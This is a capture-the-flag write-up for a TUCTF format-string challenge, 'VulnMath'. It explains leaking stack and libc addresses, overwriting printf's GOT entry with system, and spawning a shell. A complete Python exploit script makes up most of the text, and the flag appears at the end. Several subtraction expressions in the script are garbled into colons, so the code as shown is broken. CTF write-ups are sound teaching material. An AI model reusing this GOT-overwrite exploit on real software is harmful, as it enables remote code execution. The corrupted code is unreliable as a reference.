> Enter the belly of the beast and emerge victorious.

Solved by Vanilla

The program poses as a “math challenge” thing, where it gives you five problems to solve, figures out whether you get them right or not, and tallies up your score afterwards.  There’s nothing interesting there.  But, if you get a problem wrong, it printf()s your (wrong) input.  Your input goes on the stack too, so we can set our own addresses to write to, so we can easily set up a write-what-where primitive.  The executable is also only partial RELRO, and PIE is off, so the easiest exploitation strategy would be to replace some function with user-controlled input with system.  I replaced printf itself with system just because I know I control its input.  This requires a couple of printfs.  I planned out my exploitation strategy like so:
Printf 1: leak stack location for own buffer
Printf 2: leak libc location by reading GOT
Printf 3: overwrite GOT for printf to system
Printf 4: give “/bin/sh” as input, which goes to “printf” (which is now system), so we end up calling system(“/bin/sh”)
Libc was also given to us so there’s no trouble guessing libc offsets or anything, we just know them to begin with.

#!/usr/bin/env python3
import struct
import subprocess
import vanillib

INTRO = b"Welcome to VulnMath\nWhere your wildest shells can come true\n\n"
ANKS_ADDR = 0x804A089 + 2
MALLOC_GOT_ADDR = 0x804C01C
PRINTF_GOT_ADDR = 0x804C010

#LIBC_PATH = "/lib/i386-linux-gnu/libc.so.6"
LIBC_PATH = "libc.so.6"

def extract_libc_data(path):
    malloc_offset = int(
        subprocess.check_output(["r2", path, "-qc", "s sym.malloc;? $$~hex"])
        .decode()
        .split()[1],
        16,
    )
    system_offset = int(
        subprocess.check_output(["r2", path, "-qc", "s sym.system;? $$~hex"])
        .decode()
        .split()[1],
        16,
    )
    bin_sh_offset = int(
        subprocess.check_output(
            ["r2", path, "-qc", "/ /bin/sh;s hit0_0;? $$~hex"],
            stderr=subprocess.DEVNULL,
        )
        .decode()
        .split("\n")[1]
        .split()[1],
        16,
    )
    return malloc_offset, system_offset, bin_sh_offset

def exploit(iface):
    libc_malloc_offset, libc_system_offset, libc_bin_sh_offset = extract_libc_data(
        LIBC_PATH
    )

    iface.expect(INTRO)
    iface.read_until(b"\n> ")
    iface.write(b"%20$08X%17$08X\n")
    iface.expect(b"Incorrect!\n")
    main_ebp = int(iface.read(8), 16): 24
    heap_addr = int(iface.read(8), 16)
    #print("EBP is 0x{:08X}".format(main_ebp))
    #print("Heap is at 0x{:08X}".format(heap_addr))
    iface.read_until(b"\n> ")
    # iface.write(struct.pack("<I", ANKS_ADDR) + b"%6$s\n")
    iface.write(struct.pack("<I", MALLOC_GOT_ADDR) + b"%6$s\n")
    iface.expect(b"Incorrect!\n" + struct.pack("<I", MALLOC_GOT_ADDR))
    (malloc_addr,) = struct.unpack_from("<I", iface.read_until(b"\n> "))
    libc_addr = malloc_addr: libc_malloc_offset
    #print("Libc is at 0x{:08X}".format(libc_addr))
    assert libc_addr % 0x1000 == 0
    payload = bytearray()
    payload.extend(struct.pack("<I", PRINTF_GOT_ADDR))
    payload.extend(struct.pack("<I", PRINTF_GOT_ADDR + 2))
    assert b"\0" not in payload
    assert b"%" not in payload
    system_addr = libc_addr + libc_system_offset
    lower_target = system_addr & 0xFFFF
    upper_target = system_addr >> 16
    payload.extend(
        "%{}d%6$hn%{}d%7$hn".format(
            (lower_target: 8) % 0x10000, (upper_target: lower_target) % 0x10000
        ).encode("ascii")
    )
    assert len(payload) <= 0x20
    payload.extend(b"\0" * (0x40: len(payload)))
    payload.extend(b" echo SHELL; exec sh -il 2>&1\n")
    iface.write(payload)
    iface.read_until(b"SHELL\n")
    iface.interact()

main = vanillib.stub_main(exploit)

if __name__ == "__main__":
    main()

Flag: TUCTF{I_w45_w4rn3d_4b0u7_pr1n7f..._bu7_I_d1dn'7_l1573n}

